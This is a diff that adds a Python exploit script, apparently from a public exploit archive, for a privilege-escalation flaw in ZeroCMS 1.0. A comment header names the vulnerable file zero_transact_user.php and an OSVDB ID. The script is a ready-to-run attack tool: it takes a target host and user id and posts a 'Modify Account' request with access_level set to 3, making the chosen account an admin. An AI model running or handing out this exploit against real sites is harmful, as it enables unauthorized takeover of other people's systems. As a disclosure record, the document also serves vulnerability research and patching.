@@ -1,0 +1,53 @@
+import sys,getopt,cookielib,urllib2,urllib
+
+# ZeroCMS 1.0 
+# zero_transact_user.php
+# Impropper Form post hanling, (parameter polution)
+# Vendor: Another Awesome Stuff 
+# Product web page: http://www.aas9.in/zerocms/
+# author: tiago.alexand@gmail.com
+# Tested on: php 5.4.27
+# OSVDB ID: 108025
+# description
+# Summary: ZeroCMS is a very simple Content Management
+# System built using PHP and MySQL.
+# the script zero_transact_user.php contains a Modify Account case 
+# where the execution context doen't have in to consideration the current user's permitions 
+# allowing a malcious user to escalate its privileges to admin.  
+
+def  exploit(host,email,name,userid):
+   access_level = 3 # default for admin
+   url = host + '/zero_transact_user.php' #the script handles user related actions
+   args = { 'user_id':userid,'email':email, 'name':name,'access_level':access_level,'action':'Modify Account' }
+   data = urllib.urlencode(args)
+   cj = cookielib.CookieJar()
+   opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
+   response = opener.open(url,data);
+   print response.read()
+	
+def main(argv):
+   host = ''
+   email = ''
+   accountname = ''
+   userid = ''
+   try:
+      opts, args = getopt.getopt(argv,"hu:m:n:i:")
+   except getopt.GetoptError:
+      print 'zero_cms_privEscalation.py -u <host> -m <email> -n <account name> -i acount id'
+      sys.exit(2)
+   for opt, arg in opts:
+      if opt == '-h':
+         print 'zero_cms_privEscalation.py -u <host> -m <email> -n <account name> -i acount id'
+         sys.exit()
+      elif opt in ("-u"):
+         host = arg
+      elif opt in ("-m"):
+      	 email = arg
+      elif opt in ("-n"):
+      	 accountname = arg
+      elif opt in ("-i"):
+      	 userid = arg
+   exploit(host,email,accountname,userid)
+
+if __name__ == "__main__":
+   main(sys.argv[1:])
